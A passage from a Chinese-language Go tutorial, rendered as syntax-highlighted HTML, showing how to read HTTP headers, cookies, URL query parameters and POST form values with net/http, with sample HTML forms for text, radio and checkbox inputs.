punctuation">)</span> <span class="token builtin">string</span><span class="token keyword">func</span> <span class="token punctuation">(</span>h Header<span class="token punctuation">)</span> <span class="token function">Values</span><span class="token punctuation">(</span>key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span> </code></pre><ul><li><p>所有方法传入的<code>key</code>均是大小写不敏感（<code>case insensitive</code>）的。</p></li><li><p>例子：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"host"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//无效，获取不到值。Host头部不会存储到其中,使用Request.Host。</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"content-type"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"user-agent"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Fprint</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Hello Aqua"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> home<span class="token punctuation">)</span>    err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><p><strong>事实上，对于一些常见的HTTP Header，我们不用直接对<code>Header</code>进行操作，因为<code>http.Request</code>为我们封装了顶层的方法。</strong></p><ul><li><code>func (r *Request) UserAgent() string</code></li><li><code>func (r *Request) Referer() string</code></li></ul><p><strong>读取Cookie</strong></p><ul><li><code>func (r *Request) Cookies() []*Cookie</code>     //获取所有Cookie键值对</li><li><code>func (r *Request) Cookie(name string)</code>     //获取特定键值对。</li></ul><p><strong>其它</strong></p><ul><li><code>http.Request.Method</code></li><li><code>http.Request.Host</code></li></ul><h2 id="三、获取GET请求提交的数据"><a href="#三、获取GET请求提交的数据" class="headerlink" title="三、获取GET请求提交的数据"></a>三、获取GET请求提交的数据</h2><p><strong>一个<code>URL</code>典型的格式为：</strong></p><ul><li><p><code>[scheme:][//[userinfo@]host][/]path[?query][#fragment]</code></p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> URL <span class="token keyword">struct</span> <span class="token punctuation">{</span>    Scheme     <span class="token builtin">string</span>    Opaque     <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// encoded opaque data</span>    User       <span class="token operator">*</span>Userinfo <span class="token comment" spellcheck="true">// username and password information</span>    Host       <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// host or host:port</span>    Path       <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// path (relative paths may omit leading slash)</span>    RawPath    <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// encoded path hint (see EscapedPath method)</span>    ForceQuery <span class="token builtin">bool</span>      <span class="token comment" spellcheck="true">// append a query ('?') even if RawQuery is empty</span>    RawQuery   <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// encoded query values, without '?'</span>    Fragment   <span class="token builtin">string</span>    <span class="token comment" spellcheck="true">// fragment for references, without '#'</span><span class="token punctuation">}</span></code></pre></li><li><p>获取数据</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// http://localhost/home?name=Aqua&amp;age=18'</span><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// fmt.Println(r.URL.Scheme)</span>    <span class="token comment" spellcheck="true">// fmt.Println(r.URL.Host)</span>    <span class="token comment" spellcheck="true">// fmt.Println(r.URL.Hostname())</span>    <span class="token comment" spellcheck="true">// fmt.Println(r.URL.Port())</span>    <span class="token comment" spellcheck="true">//fmt.Println(r.URL.Path)      //   /home</span>    <span class="token comment" spellcheck="true">//fmt.Println(r.URL.String())  //   /home?name=Aqua&amp;age=18%27</span>    <span class="token comment" spellcheck="true">// fmt.Println(r.URL.RawPath)       // 空</span>    <span class="token comment" spellcheck="true">// fmt.Println(r.URL.EscapedPath()) // /home</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>RawQuery<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// name=Aqua&amp;age=18%27</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// map[age:[18'] name:[Aqua]]</span>    fmt<span class="token punctuation">.</span><span class="token function">Fprint</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Hello Aqua"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">,</span> home<span class="token punctuation">)</span>    err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="三、获取POST请求的数据"><a href="#三、获取POST请求的数据" class="headerlink" title="三、获取POST请求的数据"></a>三、获取POST请求的数据</h2><p><code>Request</code>结构体使用<code>Form</code>和<code>PostForm</code>存储<code>POST</code>、<code>PUT</code>、<code>PATCH</code>提交的参数，两者区别在于<code>Form</code>会连同URL中的参数也解析存储。两者使用前都必须要先调用<code>Request.ParseForm()</code>方法解析后，才会有数据。</p><p>使用<code>MultipartForm</code>存储文件上传的数据，使用前必须要先调用<code>Request.ParseMultipartForm</code>进行解析。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> Request <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token operator">...</span><span class="token operator">...</span>    <span class="token comment" spellcheck="true">// Form contains the parsed form data, including both the URL</span>    <span class="token comment" spellcheck="true">// field's query parameters and the PATCH, POST, or PUT form data.</span>    <span class="token comment" spellcheck="true">// This field is only available after ParseForm is called.</span>    <span class="token comment" spellcheck="true">// The HTTP client ignores Form and uses Body instead.</span>    Form url<span class="token punctuation">.</span>Values    <span class="token comment" spellcheck="true">// PostForm contains the parsed form data from PATCH, POST</span>    <span class="token comment" spellcheck="true">// or PUT body parameters.</span>    <span class="token comment" spellcheck="true">//</span>    <span class="token comment" spellcheck="true">// This field is only available after ParseForm is called.</span>    <span class="token comment" spellcheck="true">// The HTTP client ignores PostForm and uses Body instead.</span>    PostForm url<span class="token punctuation">.</span>Values    <span class="token comment" spellcheck="true">// MultipartForm is the parsed multipart form, including file uploads.</span>    <span class="token comment" spellcheck="true">// This field is only available after ParseMultipartForm is called.</span>    <span class="token comment" spellcheck="true">// The HTTP client ignores MultipartForm and uses Body instead.</span>    MultipartForm <span class="token operator">*</span>multipart<span class="token punctuation">.</span>Form    <span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span></code></pre><p><code>POST</code>、<code>PATCH</code>、<code>PUT</code>提交的参数经过解析后(<code>Request.ParseForm()</code>)均会被存储到<code>url.Values</code>中。</p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// the keys in a Values map are case-sensitive.</span><span class="token keyword">type</span> Values <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span></code></pre><ul><li><p><code>func (v Values) Get(key string) string</code></p><p>  可以用<code>Get</code>方法获取参数值。</p></li></ul><p>实际上，<code>http.Request</code>为我们封装了获取的参数的方法，提供的方法会自动先调用<code>Request.ParseForm()</code>，因此可以不用我们自己再去调用了。</p><ul><li><code>func (r *Request) FormValue(key string) string</code></li><li><code>func (r *Request) PostFormValue(key string) string</code></li></ul><p>对于文件上传，则是：</p><ul><li><code>func (r *Request) FormFile(key string) (multipart.File, *multipart.FileHeader, error) </code></li></ul><h5 id="文本输入：-lt-input-type-quot-text-quot-gt"><a href="#文本输入：-lt-input-type-quot-text-quot-gt" class="headerlink" title="文本输入：&lt;input type=&quot;text&quot;&gt;"></a>文本输入：<code>&lt;input type=&quot;text&quot;&gt;</code></h5><ul><li><p>前端代码：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--home.tmpl--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Home Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/home?name<span class="token punctuation">=</span>mikasa<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>            密 码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li><li><p>服务端代码：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span><span class="token function">ParseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//Form包含URL中的参数，PostForm不包含</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Form<span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">//map[name:[mikasa] password:[123456] username:[aqua]]</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Form<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//aqua</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Form<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//123456</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>Form<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//mikasa</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">//map[password:[123456] username:[aqua]]</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//aqua</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//123456</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//""</span>        <span class="token comment" spellcheck="true">//下面两种方法不用调用ParseForm()</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//aqua</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//123456</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">FormValue</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//mikasa</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">PostFormValue</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//aqua</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">PostFormValue</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//123456</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">PostFormValue</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//""</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span><span class="token string">"./home.tmpl"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">,</span> home<span class="token punctuation">)</span>    err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="单选按钮：-lt-input-type-quot-radio-quot-gt"><a href="#单选按钮：-lt-input-type-quot-radio-quot-gt" class="headerlink" title="单选按钮：&lt;input type=&quot;radio&quot;&gt;"></a>单选按钮：<code>&lt;input type=&quot;radio&quot;&gt;</code></h5><ul><li><p>前端代码：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--home.tmpl--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Home Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/home<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            性别：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>man<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>男                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>radio<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>女                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li><li><p>服务端代码：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span><span class="token function">ParseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">//map[sex:[man]]</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"sex"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//"man"</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">PostFormValue</span><span class="token punctuation">(</span><span class="token string">"sex"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//"man"</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span><span class="token string">"./home.tmpl"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token operator">...</span></code></pre></li></ul><h5 id="复选按钮：-lt-input-type-quot-checkbox-quot-gt"><a href="#复选按钮：-lt-input-type-quot-checkbox-quot-gt" class="headerlink" title="复选按钮：&lt;input type=&quot;checkbox&quot;&gt;"></a>复选按钮：<code>&lt;input type=&quot;checkbox&quot;&gt;</code></h5><ul><li><p>前端代码</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- home.tmpl --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Home Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/home<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            老婆：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wife<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mikasa<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Mikasa                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wife<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Yuigahama<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Yuigahama                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wife<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Yukinosgita<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Yukinosgita                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>checkbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wife<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Toka<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Toka                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li><li><p>服务器代码</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span><span class="token function">ParseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//map[wife:[Mikasa Yuigahama Yukinosgita Toka]]</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"wife"</span><span class="token punctuation">)</span><span class="token 